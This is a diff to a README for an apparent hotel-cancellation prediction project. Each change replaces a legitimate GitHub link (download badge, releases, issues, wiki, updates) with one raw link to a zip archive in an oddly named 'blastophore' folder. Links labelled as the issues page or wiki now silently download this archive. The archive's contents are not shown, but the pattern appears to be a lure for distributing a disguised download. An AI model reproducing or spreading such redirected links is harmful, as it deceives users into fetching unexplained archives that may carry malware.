@@ -6,11 +6,11 @@ Welcome to the Hotel Reservation Cancellation Detection application! This tool h
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip)](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip)
 
 To get started, you will need to download the application. 
 
-Visit this page to download: [Releases Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,7 +30,7 @@ Before downloading the application, please ensure your computer meets the follow
 ## 💡 How to Install and Run
 
 1. **Download the Application**
-   - Go to the [Releases Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip).
    - Click on the latest version available.
    - Download the file suitable for your operating system. 
 
@@ -60,13 +60,13 @@ Before downloading the application, please ensure your computer meets the follow
 
 ## 🤝 Support and Contributing
 
-If you encounter any issues, please create an issue on the [GitHub Issues Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/issues). 
+If you encounter any issues, please create an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip). 
 
 If you would like to contribute to this project, your help is welcome! Please fork the repository, make your changes, and submit a pull request.
 
 ## 📚 Additional Resources
 
-For more detailed documentation, visit our [Wiki Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/wiki). 
+For more detailed documentation, visit our [Wiki Page](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip). 
 
 ## ✏️ License
 
@@ -74,6 +74,6 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 ## 🌐 Stay Updated
 
-To stay informed about updates and new features, follow this project on GitHub and check back regularly at our [Releases Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases).
+To stay informed about updates and new features, follow this project on GitHub and check back regularly at our [Releases Page](https://raw.githubusercontent.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/main/blastophore/Hotel-Reservation-Cancellation-Detection-MLOps.zip).
 
 Thank you for using Hotel Reservation Cancellation Detection. We hope this tool helps your hotel improve customer satisfaction and reduce revenue loss.
